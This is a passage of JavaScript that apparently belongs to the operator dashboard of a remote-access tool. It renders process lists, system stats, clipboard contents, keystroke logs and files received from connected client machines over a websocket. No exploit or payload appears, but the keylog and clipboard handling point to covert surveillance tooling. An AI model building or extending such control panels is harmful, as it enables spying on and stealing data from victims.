        if (mod === 'ps') { S.procList = (m.body?.meta?.processes || []); renderProcList(); return; }
        if (mod === 'upload') return;
        if (mod === 'sysstat') { renderSysStat(m.body?.meta); return; }
        if (!p && (mod === 'input' || mod === 'preview')) return;
        renderBody(m.body, mod);
        if (p?.module === 'clipboard') $('#clipOut').textContent = m.body?.stdout || '';
        return;
      }

      if (m.t === 'keylog') appendKeylog(m.text);

      if (m.t === 'progress') {
        addTransfer({ id: m.xid, pct: m.pct, kind: m.kind, name: m.name });
        return;
      }

      if (m.t === 'file') {
        const f = m.file;
        term(`file · ${f.name} · ${bytes(f.size)}`, 'sys');
        addTransfer({ id: f.id, kind: f.kind, name: f.name, pct: 100 });
        refreshDetail();
        showFile(f);
        return;
      }

      if (m.t === 'log') term(m.text, 'sys');
    };

    ws.onclose = () => setTimeout(connect, 2200);
    ws.onerror = () => ws.close();
  }

  // ------------------------------------------------------------------
  // boot
  // ------------------------------------------------------------------
  wireToolbar();
  wireGrid();
  wireBulk();
  wireModal();
  wireClientEditor();
  wireGroupManager();
  wireFileOps();
  wireSysProcs();
  quickButtons();
  loadState();
  connect();
  setInterval(loadState, 15000);
})();
